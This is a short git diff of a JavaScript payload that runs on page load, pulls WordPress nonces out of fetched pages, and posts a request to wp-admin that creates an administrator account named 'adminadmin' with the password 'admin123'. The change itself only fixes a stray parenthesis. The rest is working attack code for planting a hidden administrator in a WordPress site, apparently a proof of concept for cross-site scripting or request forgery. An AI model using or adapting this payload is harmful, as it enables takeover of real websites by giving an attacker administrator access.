@@ -23,7 +23,7 @@ window.addEventListener("load", async (event) => {
 		//processing every potential nonce found
 		var nonce = "";
 		for (var i=0; i < nonce_values.length; i++) {
-			nonce = nonce_values[0].substr(7,10));
+			nonce = nonce_values[0].substr(7,10);
 			console.log(`Processing nonce ${nonce}`);
 		
 			options_post.body = `action=createuser&_wpnonce_create-user=${nonce}&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=adminadmin&email=ivan.vernichenko%40dev.pro&first_name=&last_name=&url=&pass1=admin123&pass2=admin123&pw_weak=on&send_user_notification=1&role=administrator&createuser=Add+New+User`;
